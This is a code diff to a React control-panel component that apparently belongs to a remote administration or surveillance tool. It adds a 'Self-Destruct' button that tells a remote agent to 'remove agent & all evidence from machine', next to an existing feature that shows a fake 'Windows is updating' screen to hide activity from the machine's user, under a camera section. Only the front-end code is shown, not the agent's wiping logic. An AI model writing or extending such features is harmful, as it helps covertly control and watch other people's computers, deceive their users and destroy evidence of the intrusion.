@@ -66,6 +66,15 @@ export default function ActionsManager({ sendMessage, lastMessage }) {
     sendMessage({ type: 'privacy_screen', enabled: newVal })
   }
 
+  const handleSelfDestruct = () => {
+    if (confirming !== 'self_destruct') {
+      setConfirming('self_destruct')
+      return
+    }
+    setConfirming(null)
+    sendMessage({ type: 'self_destruct' })
+  }
+
   return (
     <div className="actions-manager fade-in">
       {/* Camera & Privacy Section */}
@@ -89,6 +98,17 @@ export default function ActionsManager({ sendMessage, lastMessage }) {
             <div className="action-info">
               <h4>{privacyActive ? 'Disable Privacy Screen' : 'Enable Privacy Screen'}</h4>
               <p>{privacyActive ? 'End the fake Windows Update' : 'Show fake "Windows is updating" screen'}</p>
+            </div>
+          </div>
+
+          <div 
+            className={`action-card self-destruct-card ${confirming === 'self_destruct' ? 'confirming danger-card' : ''}`} 
+            onClick={handleSelfDestruct}
+          >
+            <div className="action-icon">☢️</div>
+            <div className="action-info">
+              <h4>{confirming === 'self_destruct' ? 'Are you sure?' : 'Self-Destruct'}</h4>
+              <p>{confirming === 'self_destruct' ? 'Click again to wipe all traces' : 'Remove agent & all evidence from machine'}</p>
             </div>
           </div>
         </div>
